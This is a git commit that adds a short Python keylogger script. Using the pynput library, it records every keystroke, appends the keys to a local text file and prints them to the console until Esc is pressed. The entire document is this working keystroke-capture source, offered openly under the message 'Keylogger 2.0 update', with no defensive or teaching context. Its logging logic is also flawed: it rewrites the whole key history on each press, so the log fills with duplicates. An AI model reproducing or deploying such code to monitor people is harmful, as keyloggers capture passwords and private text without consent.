83c3d4046c1ac0f541eb02e84aaf087183bff8ad
mhamedbelhachemi <mhamed79@live.fr>
2021-01-22 14:55:48 +0100

    Keylogger 2.0 update | you can fil a txt file

---
+++ Keylogger/Keylogger.py
@@ -0,0 +1,29 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def write_register(keys):
+    with open("Keylogger/register.txt","a") as register:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                register.write('\n')
+            elif k.find("key") == -1:
+                register.write(k)
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count+=1
+    write_register(keys)
+    print("{} pressed".format(key))
+
+def on_release(key):
+    if(key == Key.esc):
+        return False
+
+
+with Listener(on_press = on_press, on_release = on_release) as listner:
+    listner.join()
